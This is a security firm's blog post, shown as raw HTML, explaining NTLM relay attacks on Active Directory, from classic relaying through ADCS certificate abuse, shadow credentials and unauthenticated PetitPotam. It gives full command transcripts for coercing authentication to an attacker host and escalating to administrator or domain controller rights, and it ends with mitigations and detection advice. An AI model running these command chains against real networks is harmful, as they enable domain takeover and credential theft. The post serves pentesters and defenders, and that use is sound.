<html data-wf-domain="www.fortalicesolutions.com" data-wf-page="611d378b438aa38cbe27d6e3" data-wf-site="611d378b438aa3f85927d6dc" data-wf-status="1" class=" w-mod-js w-mod-ix"><head><style>.wf-force-outline-none[tabindex="-1"]:focus{outline:none;}</style><meta charset="utf-8"><title>Keeping Up with the NTLM Relay</title><meta content="Back when I was getting started as a junior pentester, I vividly remember reading [@byt3bl33d3r](https://twitter.com/byt3bl33d3r)'s 2017 post: [Practical guide to NTLM Relaying in 2017 (A.K.A getting a foothold in under 5 minutes)](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html). I still recommend checking this out if you haven't already - it will cover the basics of NTLM relaying and background on some of the confusing pieces ([Net]NTLMv1/2 anyone?) that there's no need for me to repeat here. There's also a plethora of other great NTLM relay blogs and resources that I'll try to link to throughout this post, while I attempt to touch on the ever growing library of NTLM relay uses after 2021 introduced several new relay vectors." name="description"><meta content="Keeping Up with the NTLM Relay" property="og:title"><meta content="Back when I was getting started as a junior pentester, I vividly remember reading [@byt3bl33d3r](https://twitter.com/byt3bl33d3r)'s 2017 post: [Practical guide to NTLM Relaying in 2017 (A.K.A getting a foothold in under 5 minutes)](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html). I still recommend checking this out if you haven't already - it will cover the basics of NTLM relaying and background on some of the confusing pieces ([Net]NTLMv1/2 anyone?) that there's no need for me to repeat here. There's also a plethora of other great NTLM relay blogs and resources that I'll try to link to throughout this post, while I attempt to touch on the ever growing library of NTLM relay uses after 2021 introduced several new relay vectors." property="og:description"><meta content="https://assets-global.website-files.com/611d378b438aa32eb527d6ea/620ac39bc50a2e8a1eecba3d_thumbnail.png" property="og:image"><meta content="Keeping Up with the NTLM Relay" property="twitter:title"><meta content="Back when I was getting started as a junior pentester, I vividly remember reading [@byt3bl33d3r](https://twitter.com/byt3bl33d3r)'s 2017 post: [Practical guide to NTLM Relaying in 2017 (A.K.A getting a foothold in under 5 minutes)](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html). I still recommend checking this out if you haven't already - it will cover the basics of NTLM relaying and background on some of the confusing pieces ([Net]NTLMv1/2 anyone?) that there's no need for me to repeat here. There's also a plethora of other great NTLM relay blogs and resources that I'll try to link to throughout this post, while I attempt to touch on the ever growing library of NTLM relay uses after 2021 introduced several new relay vectors." property="twitter:description"><meta content="https://assets-global.website-files.com/611d378b438aa32eb527d6ea/620ac39bc50a2e8a1eecba3d_thumbnail.png" property="twitter:image"><meta property="og:type" content="website"><meta content="summary_large_image" name="twitter:card"><meta content="width=device-width, initial-scale=1" name="viewport"><meta content="Webflow" name="generator"><link href="https://assets-global.website-files.com/611d378b438aa3f85927d6dc/css/fortalice.webflow.a568e6d72.css" rel="stylesheet" type="text/css"><script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script><script type="text/javascript" async="" src="https://www.googletagmanager.com/gtag/js?id=G-PW2CQVXVK3&amp;l=dataLayer&amp;cx=c"></script><script type="text/javascript" async="" src="https://www.googletagmanager.com/gtag/js?id=UA-44954430-1&amp;l=dataLayer&amp;cx=c"></script><script type="text/javascript">!function(o,c){var n=c.documentElement,t=" w-mod-";n.className+=t+"js",("ontouchstart"in o||o.DocumentTouch&&c instanceof DocumentTouch)&&(n.className+=t+"touch")}(window,document);</script><link href="https://assets-global.website-files.com/611d378b438aa3f85927d6dc/611d378b438aa39cca27d732_favicon-32.png" rel="shortcut icon" type="image/x-icon"><link href="https://assets-global.website-files.com/611d378b438aa3f85927d6dc/611d378b438aa317c927d733_favicon-256.png" rel="apple-touch-icon"><script async="" src="https://www.googletagmanager.com/gtag/js?id=G-6TGYR3QZXN"></script><script type="text/javascript">window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());gtag('config', 'G-6TGYR3QZXN', {'anonymize_ip': false});</script><link rel="stylesheet" type="text/css" href="https://cloud.typography.com/85520/7548832/css/fonts.css">
<style>
  body {
    font-family: "Gotham SSm A", "Gotham SSm B";
    font-weight: 500;
  }
  
  h1 {
    font-family: "Gotham SSm A", "Gotham SSm B";
    font-style: italic;
    font-weight: 800;
  }
  
  h2 {
    font-family: "Gotham SSm A", "Gotham SSm B";
	font-style: normal;
	font-weight: 800;
  }
  
  .book {
    font-family: "Gotham SSm A", "Gotham SSm B";
    font-style: normal;
    font-weight: 400;
  }
  .bookitalic {
    font-family: "Gotham SSm A", "Gotham SSm B";
    font-style: italic;
    font-weight: 400;
  }
  .medium {
    font-family: "Gotham SSm A", "Gotham SSm B";
    font-style: normal;
    font-weight: 500;
  }
  .mediumitalic {
    font-family: "Gotham SSm A", "Gotham SSm B";
    font-style: italic;
    font-weight: 500;
  }
  .black {
    font-family: "Gotham SSm A", "Gotham SSm B";
	font-style: normal;
	font-weight: 800;
  }
  .blackitalic {
    font-family: "Gotham SSm A", "Gotham SSm B";
    font-style: italic;
    font-weight: 800;
  }
</style><script src="https://unpkg.com/postscribe@2/dist/postscribe.min.js"></script>
<script src="https://unpkg.com/showdown@1/dist/showdown.min.js"></script>
<link rel="stylesheet" href="https://unpkg.com/@highlightjs/cdn-assets@11/styles/vs2015.min.css">
<script src="https://unpkg.com/@highlightjs/cdn-assets@11/highlight.min.js"></script>
<script type="text/javascript" src="https://unpkg.com/highlightjs-cypher/dist/cypher.min.js"></script>
<style>
  pre[class*="language-"] {
    font-size: 0.85em;
    line-height: 1.25em;
  }
  code[class*="language-"] {
    line-height: 1.25em;
  }
  
  pre code.hljs {
  	white-space: pre-wrap;
  }

	.markdown {
  	color: #0b1f41;
  }
</style>
</head><body><div class="section-18"><div class="container"><div class="navigation"><a href="/" class="w-inline-block"><img src="https://assets-global.website-files.com/611d378b438aa3f85927d6dc/611d378b438aa35fbf27d71b_logo-white.svg" loading="lazy" height="50" alt="" class="image-2"></a><link rel="prerender" href="/"><div class="div-block-4"><a href="/training" class="navigation-link">TRAINING</a><link rel="prerender" href="/training"><img src="https://assets-global.website-files.com/611d378b438aa3f85927d6dc/611d378b438aa3d24b27d715_star.svg" loading="lazy" width="10" height="" alt=""><a href="/services" class="navigation-link">SERVICES</a><link rel="prerender" href="/services"><img src="https://assets-global.website-files.com/611d378b438aa3f85927d6dc/611d378b438aa3d24b27d715_star.svg" loading="lazy" width="10" height="" alt=""><a href="/blog" class="navigation-link">EXPERTS BLOG</a><img src="https://assets-global.website-files.com/611d378b438aa3f85927d6dc/611d378b438aa3d24b27d715_star.svg" loading="lazy" width="10" height="" alt=""><a href="#lets-talk" class="navigation-link">LET'S TALK</a></div></div></div></div><div><div class="container"><h1 class="heading-8">Experts Blog</h1></div></div><div><div class="column-container"><div class="div-block-43"><img loading="lazy" alt="" src="https://assets-global.website-files.com/611d378b438aa32eb527d6ea/620ac39bc50a2e8a1eecba3d_thumbnail.png" sizes="(max-width: 479px) 96vw, (max-width: 767px) 97vw, (max-width: 991px) 96vw, 65vw" srcset="https://assets-global.website-files.com/611d378b438aa32eb527d6ea/620ac39bc50a2e8a1eecba3d_thumbnail-p-500.png 500w, https://assets-global.website-files.com/611d378b438aa32eb527d6ea/620ac39bc50a2e8a1eecba3d_thumbnail-p-800.png 800w, https://assets-global.website-files.com/611d378b438aa32eb527d6ea/620ac39bc50a2e8a1eecba3d_thumbnail-p-1080.png 1080w, https://assets-global.website-files.com/611d378b438aa32eb527d6ea/620ac39bc50a2e8a1eecba3d_thumbnail.png 1140w" class="image-14"><div class="text-block-18">Keeping Up with the NTLM Relay</div><div class="text-block-23">February 11, 2022</div><div class="div-block-44"><img loading="lazy" alt="" src="https://assets-global.website-files.com/611d378b438aa32eb527d6ea/611d378b438aa3513527d797_headshot%20(1).jpg" class="image-15"><div class="text-block-31">Matthew Creel</div></div><div class="div-block-45"><div class="markdown w-richtext"><h3 id="keeping-up-with-the-ntlm-relay">Keeping Up with the NTLM Relay</h3>
<p>Back in when I was getting started as a junior pentester, I vividly remember reading
<a href="https://twitter.com/byt3bl33d3r">@byt3bl33d3r</a>'s 2017 post: <a href="https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html">Practical guide to NTLM Relaying in 2017 (A.K.A getting a foothold in under 5 minutes)</a>. I still recommend checking this out if you haven't already - it will cover the basics of NTLM relaying and background on some of the confusing pieces ([Net]NTLMv1/2 anyone?) that there's no need for me to repeat here. There's also a plethora of other great NTLM relay blogs and resources that I'll try to link to throughout this post, while I attempt to touch on the ever growing library of NTLM relay uses after 2021 introduced several new relay vectors.</p>
<p>‍</p>
<p><a href="#the-classic-ntlm-relay-attack">#1 - The Classic NTLM Relay Attack</a></p>
<p><a href="#adcs-compromise-via-ntlm-relay">#2 - ADCS Compromise via NTLM Relay</a></p>
<p><a href="#workstation-takeover-via-ntlm-relay">#3 - Workstation Takeover via NTLM Relay</a></p>
<p><a href="#substituting-initial-account-compromise-with-more-ntlm-relay">#4 - Substituting Initial Account Compromise with More NTLM Relay</a></p>
<p>‍</p>
<h4 id="the-classic-ntlm-relay-attack">The Classic NTLM Relay Attack</h4>
<p>This is what has been around for years. Your laptop or NUC is on the internal network and you so you fire up ntlmrelayx with either Responder or Mitm6 and in no time you're relaying hashes around to other workstations and servers over SMB. Here's a quick (simplified) refresher of the attack flow:</p>
<figure style="max-width:1748pxpx" class="w-richtext-align-fullwidth w-richtext-figure-type-image"><div><img src="https://assets-global.website-files.com/611d378b438aa32eb527d6ea/620aca09088cd82116d613ff_graphic_1.png" loading="lazy" alt=""></div></figure>
<p>Check out this <a href="https://en.hackndo.com/ntlm-relay/">post</a> for much more technical detail on the above.</p>
<p>There are some standard variations of this, a good example being cross-protocol relay of HTTP authentication to LDAP for Active Directory enumeration or escalation, a capability offered by <code>ntlmrelayx</code>. These attack chains are still entirely more common than we'd hope to see. However, there are more encounters nowadays with networks where precaution has been taken through disabling LLMNR/NBT-NS and/or enabled SMB signing. This can make your relay toolkit harder to use - but not impossible.</p>
<p>Keep these two [<a href="https://www.thehacker.recipes/~/files/v0/b/gitbook-28427.appspot.com/o/assets%2F-MHRw3PMJtbDDjbxm5ub%2F-MhIMLgS9LWega9f__Oh%2F-MQNyCmNNlnr6fLL_SCF%2Fntlm_relay_mitigation_chart.png?alt=media&amp;token=6547487a-5a35-45f0-a9b5-7779a4b02722">1</a>, <a href="https://www.thehacker.recipes/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MHRw3PMJtbDDjbxm5ub%2Fuploads%2FYhI0upGYTkhDEbm8vyHX%2FNTLM%20relay.drawio.png?alt=media&amp;token=317e28f8-d83f-4c95-aa8c-7302adb2319f">2</a>] graphics in mind before continuing below (taken from another great NTLM relay resource <a href="https://www.thehacker.recipes/ad/movement/ntlm/relay">here</a>).</p>
<p>‍</p>
<h4 id="a-word-on-machine-authentication-coercion">A Word on Machine Authentication Coercion</h4>
<p>Something I don't think existed (at least publicly) at the time of Marcello's 2017 guide was a mechanism by which an attacker could force a remote machine to authenticate back to an arbitrary IP address. Since then, Lee Christensen (<a href="https://twitter.com/tifkin">@tifkin_</a>) has published the printerbug (2018), as a part of research related to <a href="https://posts.specterops.io/not-a-security-boundary-breaking-forest-trusts-cd125829518d">forest trusts</a>, and during the summer of 2021, Gilles Lionel (<a href="https://twitter.com/topotam77">@topotam77</a>) published PetitPotam. Most recently, Charlie Bromberg (<a href="https://twitter.com/_nwodtuhs">@_nwodtuhs</a>) published a PoC, ShadowCoerce, which is more targeted at domain controllers.</p>
<p>Each of these take advantage of different Windows RPC functions in a way that open the door for an authenticated attacker to coerce a remote machine to authenticate back to an attacker-controlled host. (Side note: there is an amazing <a href="https://itm4n.github.io/from-rpcview-to-petitpotam/">blog</a> about searching for these.) Attacks based off these coercion techniques are somewhat comparable to the <a href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/">PrivExchange</a> scenario.</p>
<p>The ability to force a machine to authenticate to you, by default over SMB, has spawned some interesting new use cases, described below. You can of course, still try to abuse this captured authentication as you normally would with ntlmrelayx, with the caveat that the captured computer authentication likely requires local admin privileges to your relay target. You can query for this in BloodHound:</p>
<p>‍</p>
<pre><code class="cypher language-cypher hljs" data-highlighted="yes"><span class="hljs-keyword">MATCH</span> p = (m:<span class="hljs-type">Computer</span>)-[r1:<span class="hljs-type">AdminTo</span>]-&gt;(n:<span class="hljs-type">Computer</span>) <span class="hljs-keyword">RETURN</span> p <span class="hljs-keyword">UNION</span> ALL <span class="hljs-keyword">MATCH</span> p = (c:<span class="hljs-type">Computer</span>)-[r2:<span class="hljs-type">MemberOf</span>|HasSIDHistory*<span class="hljs-number">1.</span>.]-&gt;(g:<span class="hljs-type">Group</span>)-[r3:<span class="hljs-type">AdminTo</span>]-&gt;(d:<span class="hljs-type">Computer</span>) <span class="hljs-keyword">RETURN</span> p
</code></pre>
<p>‍</p>
<h4 id="adcs-compromise-via-ntlm-relay">ADCS Compromise via NTLM Relay</h4>
<p>As a result of the <a href="https://specterops.io/assets/resources/Certified_Pre-Owned.pdf">Certified Pre-Owned</a> research, the attack dubbed <em>ESC8</em> became very popular. This involves relaying coerced machine account authentication to an ADCS (Active Directory Certificate Services) web enrollment service (which accepts NTLM auth, by default) and obtaining a certificate that enables domain authentication as the target. Here's the flow for taking over a workstation or server in this manner:</p>
<figure style="max-width:1728pxpx" class="w-richtext-align-fullwidth w-richtext-figure-type-image"><div><img src="https://assets-global.website-files.com/611d378b438aa32eb527d6ea/620aca3c71d4ca5d2d10ebb3_graphic_2.png" loading="lazy" alt=""></div></figure>
<p>If your target is a domain controller, there's no need for S4U. Once you have a TGT you can just go right to DCSync. That's probably the most well documented variation of this attack, but it's usually possible to target any system in this manner. (Targeting a DC in this attack may not even require a compromised credential for PetitPotam, but we'll come back to that.)</p>
<p>‍</p>
<h5 id="example-attack-transcript">Example Attack Transcript</h5>
<pre><code class="bash language-bash hljs" data-highlighted="yes"><span class="hljs-comment"># https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py</span>
python3 ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp --adcs --template [DomainController|Machine] -smb2support

<span class="hljs-comment"># https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py</span>
python3 printerbug.py domain.local/user:pass@target.domain.local &lt;attacker ip&gt;

<span class="hljs-comment"># OR</span>
<span class="hljs-comment"># https://github.com/topotam/PetitPotam/blob/main/PetitPotam.py</span>
python3 PetitPotam.py -u user -p pass -d domain.local &lt;attacker ip&gt; target.domain.local

<span class="hljs-comment"># Obtain TGT using https://github.com/dirkjanm/PKINITtools</span>
<span class="hljs-comment"># Use the base64 certificate blob from ntlmrelayx, or decode the base64 to a file and use the -cert-pfx flag</span>
python3 gettgtpkinit.py domain.local/target\$ target.ccache -pfx-base64 &lt;<span class="hljs-built_in">base64</span> blob&gt;

<span class="hljs-comment"># Obtain a TGS using S4U2Self to obtain admin rights on the target</span>
python3 gets4uticket.py kerberos+ccache://domain.local\\target\$:target.ccache@dc.domain.local cifs/target.domain.local@domain.local administrator@domain.local administrator.ccache -v
</code></pre>
<h4 id="workstation-takeover-via-ntlm-relay">Workstation Takeover via NTLM Relay</h4>
<p>I won't spend too much time on this scenario since I've posted more in depth about the shadow credentials variation of this attack <a href="https://www.fortalicesolutions.com/posts/shadow-credentials-workstation-takeover-edition">here</a>. In short, if you can relay your coerced authentication to a DC over LDAP(S) there are two potential ways you can obtain admin rights to the target: shadow credentials and resource-based constrained delegation (RBCD). A great post describing the RBCD variation can be found <a href="https://gist.github.com/gladiatx0r/1ffe59031d42c08603a3bde0ff678feb">here</a>.</p>
<p>The trick here is that SMB authentication can't usually be relayed over LDAP due to session signing. A good alternative is coercing auth to a WebDAV backconnect, but this requires the target to have the Web Client service running, generally limiting this attack to workstations. Give the articles I linked to above a read for more details and examples!</p>
<p>Keeping up with the visual breakdown, these two workstation takeover scenarios look like this:</p>
<p>‍</p>
<figure style="max-width:1682pxpx" class="w-richtext-align-fullwidth w-richtext-figure-type-image"><div><img src="https://assets-global.website-files.com/611d378b438aa32eb527d6ea/620d0790376ddc8566308012_MicrosoftTeams-image%20(3).png" loading="lazy" alt=""></div></figure>
<p>‍</p>
<h5 id="example-attack-transcript-1">Example Attack Transcript</h5>
<pre><code class="bash language-bash hljs" data-highlighted="yes"><span class="hljs-comment"># https://github.com/ShutdownRepo/impacket/tree/pywhisker</span>
python3 ntlmrelayx.py -t ldap://dc.domain.local --shadow-credentials --shadow-target target\$

<span class="hljs-comment"># https://github.com/lgandx/Responder</span>
<span class="hljs-comment"># SMB and HTTP off</span>
<span class="hljs-comment"># Will poison the name in your UNC path below, if target attempts to resolve over LLMNR/NBT-NS</span>
./Responder.py -I eth0 -w

<span class="hljs-comment"># https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py</span>
python3 printerbug.py domain.local/user:pass@target.domain.local badhost@80/path

<span class="hljs-comment"># OR</span>
<span class="hljs-comment"># https://github.com/topotam/PetitPotam/blob/main/PetitPotam.py</span>
python3 PetitPotam.py -u user -p pass -d domain.local badhost@80/path target.domain.local

<span class="hljs-comment"># Obtain TGT using https://github.com/dirkjanm/PKINITtools</span>
<span class="hljs-comment"># pfx file and pfx password will be generated by ntlmrelayx</span>
python3 gettgtpkinit.py domain.local/target\$ target.ccache -cert-pfx &lt;pfx file path&gt; -pfx-pass &lt;pfx password&gt;

<span class="hljs-comment"># Obtain a TGS using S4U2Self to obtain admin rights on the target</span>
python3 gets4uticket.py kerberos+ccache://domain.local\\target\$:target.ccache@dc.domain.local cifs/target.domain.local@domain.local administrator@domain.local administrator.ccache -v
</code></pre>
<p>‍</p>
<h4 id="substituting-initial-account-compromise-with-more-ntlm-relay">Substituting Initial Account Compromise with More NTLM Relay</h4>
<p>Why not crank up the difficulty? Up until this point, the authentication coercion + relay scenarios I've covered have been using a previously known/compromised account to kick off the coercion mechanism. These attacks are still potentially viable if you <em>do not</em> own a credential due to the fact that domain controllers without an August 2021 patch are vulnerable to unauthenticated PetitPotam. You may know this already, as the big attack vector floating around after PetitPotam's release was unauthenticated DC compromise through relaying to an ADCS web enrollment endpoint. However, the shadow credentials/RBCD attack vector can leverage this too by wrapping in an extra round of relaying.</p>
<p>The first time I saw possibility mentioned, was by <a href="https://twitter.com/gladiatx0r">@gladiatx0r</a> in a <a href="https://twitter.com/gladiatx0r/status/1431273725664665604">tweet</a>:</p>
<p>‍</p>
<figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img src="https://assets-global.website-files.com/611d378b438aa32eb527d6ea/620aca711d304e77582c5b8f_maximus_tweet.png" loading="lazy" alt=""></div></figure>
<p>‍</p>
<p>The overall attack flow looks like this:</p>
<p>‍</p>
<figure style="max-width:1676pxpx" class="w-richtext-align-fullwidth w-richtext-figure-type-image"><div><img src="https://assets-global.website-files.com/611d378b438aa32eb527d6ea/620d07cd078fc24ed48acc63_MicrosoftTeams-image%20(4).png" loading="lazy" alt=""></div></figure>
<p>‍</p>
<h5 id="example-attack-transcript-2">Example Attack Transcript</h5>
<pre><code class="bash language-bash hljs" data-highlighted="yes"><span class="hljs-comment"># https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py</span>
<span class="hljs-comment"># Setup to relay auth from the DC to your target</span>
python3 ntlmrelayx.py -t smb://target.domain.local -smb2support -socks

<span class="hljs-comment"># https://github.com/topotam/PetitPotam/blob/main/PetitPotam.py</span>
<span class="hljs-comment"># Target unpatched DC with unauthenticated PetitPotam</span>
python3 PetitPotam.py -u <span class="hljs-string">''</span> -p <span class="hljs-string">''</span> -d <span class="hljs-string">''</span> &lt;attacker ip&gt; dc.domain.local

<span class="hljs-comment"># Stop the current ntlmrelayx servers to free the ports, but leave the SOCKS proxy running</span>
ntlmrelayx&gt; stopservers

<span class="hljs-comment"># https://github.com/ShutdownRepo/impacket/tree/pywhisker</span>
<span class="hljs-comment"># Start a second instance of ntlmrelayx, this time for shadow credential attack</span>
python3 ntlmrelayx.py -t ldap://dc.domain.local --shadow-credentials --shadow-target target\$

<span class="hljs-comment"># https://github.com/lgandx/Responder</span>
<span class="hljs-comment"># SMB and HTTP off</span>
<span class="hljs-comment"># Will poison the name in your UNC path below, if target attempts to resolve over LLMNR/NBT-NS</span>
./Responder.py -I eth0 -w

<span class="hljs-comment"># https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py</span>
<span class="hljs-comment"># Trigger auth from your target, authenticating through the SOCKS proxy as the vulnerable DC</span>
proxychains python3 printerbug.py DOMAIN/DC\$:fakepass@target.domain.local badhost@80/path

<span class="hljs-comment"># OR</span>
<span class="hljs-comment"># https://github.com/topotam/PetitPotam/blob/main/PetitPotam.py</span>
proxychains python3 PetitPotam.py -u DC\$ -p fakepass -d DOMAIN badhost@80/path target.domain.local

<span class="hljs-comment"># Obtain TGT using https://github.com/dirkjanm/PKINITtools</span>
<span class="hljs-comment"># pfx file and pfx password will be generated by ntlmrelayx</span>
python3 gettgtpkinit.py domain.local/target\$ target.ccache -cert-pfx &lt;pfx file path&gt; -pfx-pass &lt;pfx password&gt;

<span class="hljs-comment"># Obtain a TGS using S4U2Self to obtain admin rights on the target</span>
python3 gets4uticket.py kerberos+ccache://domain.local\\target\$:target.ccache@dc.domain.local cifs/target.domain.local@domain.local administrator@domain.local administrator.ccache -v
</code></pre>
<p>‍</p>
<p>I haven't used that exact flow on an enagement yet, but near the end of 2021 I was placed in a scenario where a DC, which doubled as the domain's sole CA, was missing the unauthenticated PetitPotam patch. Since the DC/CA were the same host, I was unable to trigger PetitPotam and directly enroll in a certificate as the DC. However, by using the unauthenticated PetitPotam + SOCKS proxy trick described above, I was able to enroll in a certificate template as a high-value server without any compromised credentials to start the attack. The more I type this out, the more confusing it sounds so hopefully the visual clears it up:</p>
<p>‍</p>
<figure style="max-width:1974pxpx" class="w-richtext-align-fullwidth w-richtext-figure-type-image"><div><img src="https://assets-global.website-files.com/611d378b438aa32eb527d6ea/620aca90088cd84099d652c1_graphics_5.png" loading="lazy" alt=""></div></figure>
<p>‍</p>
<h4 id="new-ntlm-relay-tooling">New NTLM Relay Tooling?</h4>
<p>2021 also brought us some new relay tooling, or at least some tools teases that I'm keeping tabs on.</p>
<h5 id="lsarelayx">lsarelayx</h5>
<p><a href="https://github.com/CCob/lsarelayx">lsarelayx</a> was released by <a href="https://twitter.com/_EthicalChaos_">@<em>EthicalChaos</em></a> in November 2021. This requires administrator rights on a Windows machine to use, but allows for system wide NTLM relay through the use of a LSA authentication plugin that gets loaded by LSASS. I still haven't played with lsarelayx myself, but it's on my bucket list.</p>
<h5 id="farmer-v20">Farmer v2.0?</h5>
<p><a href="https://github.com/mdsecactivebreach/Farmer">Farmer</a> is a powerful NetNTLM hash havesting tool which has come up clutch for me on at least one engagement. The associated <a href="https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/">blog</a> also has some great information on WebDAV tricks. Dominic Chell teased an unreleased version of Farmer with relay capabilities on <a href="https://twitter.com/domchell/status/1432411230334033920">Twitter</a> in August 2021. </p>
<p>‍</p>
<h4 id="mitigations-and-detections">Mitigations and Detections</h4>
<p>Short of disabling NTLM authentication across the organization (which would prevent all the relay attacks described in this post, but isn't feasible for everyone), here are some potential mitigation and detection strategies. </p>
<ul>
<li>Disable LLMNR and NetBIOS Name Service</li>
<li>Enforce session signing on SMB and LDAP</li>
<li>Enforce EPA (Extended Protection for Authentication) on LDAPS and HTTPS</li>
<li>Disable the ADCS web enrollment endpoint. If this cannot be done, NTLM authentication can be disabled on the host level or service level (IIS) on the certificate authority. Step-by-step instructions can be found in this <a href="https://www.truesec.com/hub/blog/mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-adv210003-kb5005413-petitpotam">post</a>.</li>
<li>Disable the Web Client service</li>
<li>Disable the Print Spooler service</li>
<li>Block or alert on potentially malicious RPC use (i.e. MS-EFSR, MS-RPRN) with <a href="https://github.com/zeronetworks/rpcfirewall">rpcfirewall</a></li>
<li>Monitor for Kerberos TGTs requested (event ID 4768) using PKINIT authentication if the behavior is not standard for the network environment or account.</li>
<li>Monitor for AD object modifications (event ID 5136 or 4662) where the attribute being modified is <code>msDS-KeyCredentialLink</code> or <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>.</li>
<li>Monitor event ID 4420 from the EFS source</li>
<li>Monitor for <code>AllowAllCliAuth</code> <a href="https://support.microsoft.com/en-au/topic/kb5009763-efs-security-hardening-changes-in-cve-2021-43217-719fbc9d-ad9b-4f90-a964-0afe40338002">registry key</a> changes</li>
</ul>
<p>‍</p>
<h4 id="references-and-credits">References and Credits</h4>
<ul>
<li>https://www.thehacker.recipes/ad/movement/ntlm/relay</li>
<li>https://en.hackndo.com/ntlm-relay/</li>
<li>https://hunter2.gitbook.io/darthsidious/execution/responder-with-ntlm-relay-and-empire</li>
<li>https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html</li>
<li>https://fr.slideshare.net/LionelTopotam/petit-potam-slidesrtfmossir</li>
<li>https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022/?utm_campaign=Blog%20Posts&amp;utm_content=196648608&amp;utm_medium=social&amp;utm_source=twitter&amp;hss_channel=tw-403811306</li>
</ul>
<p>‍</p></div><div class="rich-text-block-3 w-condition-invisible w-dyn-bind-empty w-richtext"></div></div><div class="w-dyn-list"><div role="list" class="collection-list-4 w-dyn-items"><div role="listitem" class="w-dyn-item"><a href="/tags/fortalice" class="link-block-3 w-inline-block"><div class="text-block-19">Fortalice</div></a></div><div role="listitem" class="w-dyn-item"><a href="/tags/offensive-cybersecurity-operations" class="link-block-3 w-inline-block"><div class="text-block-19">Offensive Cybersecurity Operations</div></a></div></div></div><div class="sharethis-inline-share-buttons"></div><div class="div-block-46"><div class="div-block-47"><div class="text-block-20">Related Posts</div></div><div class="w-dyn-list"><div role="list" class="collection-list-5 w-dyn-items"><div role="listitem" class="collection-item-6 w-dyn-item"><a href="/posts/unitedhealth-breach" class="link-block-8 w-inline-block"><img loading="lazy" alt="" src="https://assets-global.website-files.com/611d378b438aa32eb527d6ea/6629582805a85c43f54a9a8e_breach.jpg" sizes="(max-width: 479px) 96vw, (max-width: 767px) 97vw, (max-width: 991px) 46vw, 30vw" srcset="https://assets-global.website-files.com/611d378b438aa32eb527d6ea/6629582805a85c43f54a9a8e_breach-p-500.jpg 500w, https://assets-global.website-files.com/611d378b438aa32eb527d6ea/6629582805a85c43f54a9a8e_breach.jpg 690w" class="image-16"><div class="text-block-21">UnitedHealth Breach</div><div class="div-block-48"><img loading="lazy" alt="" src="https://assets-global.website-files.com/611d378b438aa32eb527d6ea/611d378b438aa3580727d781_11.jpg" class="image-17"><div class="text-block-32">Red Team</div></div><p class="paragraph-16 w-dyn-bind-empty"></p></a></div><div role="listitem" class="collection-item-6 w-dyn-item"><a href="/posts/appsecassessments" class="link-block-8 w-inline-block"><img loading="lazy" alt="" src="https://assets-global.website-files.com/611d378b438aa32eb527d6ea/64b57671615298503801f896_APP%20SEC%20Assessments.png" sizes="(max-width: 479px) 96vw, (max-width: 767px) 97vw, (max-width: 991px) 46vw, 30vw" srcset="https://assets-global.website-files.com/611d378b438aa32eb527d6ea/64b57671615298503801f896_APP%20SEC%20Assessments-p-500.png 500w, https://assets-global.website-files.com/611d378b438aa32eb527d6ea/64b57671615298503801f896_APP%20SEC%20Assessments-p-800.png 800w, https://assets-global.website-files.com/611d378b438aa32eb527d6ea/64b57671615298503801f896_APP%20SEC%20Assessments-p-1080.png 1080w, https://assets-global.website-files.com/611d378b438aa32eb527d6ea/64b57671615298503801f896_APP%20SEC%20Assessments.png 1400w" class="image-16"><div class="text-block-21">Comprehensive Application Security Assessments: Identifying and Addressing Application Vulnerabilities</div><div class="div-block-48"><img loading="lazy" alt="" src="https://assets-global.website-files.com/611d378b438aa32eb527d6ea/611d378b438aa35c3f27d77a_star.jpg" class="image-17"><div class="text-block-32">Fortalice Solutions</div></div><p class="paragraph-16">Discover the significance of comprehensive application security assessments in identifying and addressing software vulnerabilities. Learn about the different types, including manual code reviews, automated vulnerability scanning, penetration testing, and security architecture reviews. Fortalice blog offers valuable insights to help you choose the right assessment for your organization.</p></a></div></div></div></div></div><div class="block-sidebar"><div class="blog-sidebar-section"><div class="text-block-13">Categories</div><div class="w-dyn-list"><div role="list" class="w-dyn-items"><div role="listitem" class="collection-item-3 w-dyn-item"><a href="/categories/application-security" class="blog-sidebar-link book">Application Security</a></div><div role="listitem" class="collection-item-3 w-dyn-item"><a href="/categories/press-release" class="blog-sidebar-link book">Press Release</a></div><div role="listitem" class="collection-item-3 w-dyn-item"><a href="/categories/client-advisory" class="blog-sidebar-link book">Client Advisory</a></div><div role="listitem" class="collection-item-3 w-dyn-item"><a href="/categories/defensive-perspectives" class="blog-sidebar-link book">Defensive Perspectives</a></div><div role="listitem" class="collection-item-3 w-dyn-item"><a href="/categories/offensive-perspectives" class="blog-sidebar-link book">Offensive Perspectives</a></div><div role="listitem" class="collection-item-3 w-dyn-item"><a href="/categories/executive-perspectives" class="blog-sidebar-link book">Executive Perspectives</a></div></div></div></div><div class="blog-sidebar-section"><div class="text-block-13">Recent Posts</div><div class="w-dyn-list"><div role="list" class="w-dyn-items"><div role="listitem" class="collection-item-8 w-dyn-item"><a href="/posts/predicting-the-future-of-cybersecurity" class="blog-sidebar-link book">Predicting the Future of Cybersecurity</a></div><div role="listitem" class="collection-item-8 w-dyn-item"><a href="/posts/unitedhealth-breach" class="blog-sidebar-link 